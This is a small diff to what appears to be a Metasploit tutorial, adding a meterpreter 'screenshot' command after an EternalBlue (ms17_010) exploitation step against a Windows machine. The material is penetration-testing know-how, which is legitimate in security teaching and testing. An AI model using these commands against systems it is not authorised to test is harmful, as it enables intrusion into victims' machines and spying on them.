@@ -34,6 +34,8 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit (Start attack)
 
 meterpreter> help (if the attack is successfull, it will show meterpreter)
 
+meterpreter> screenshot (will take a screenshot of the victim machine)
+
 
 Exploiting Linux/GNU Machine Using Metasploit
 
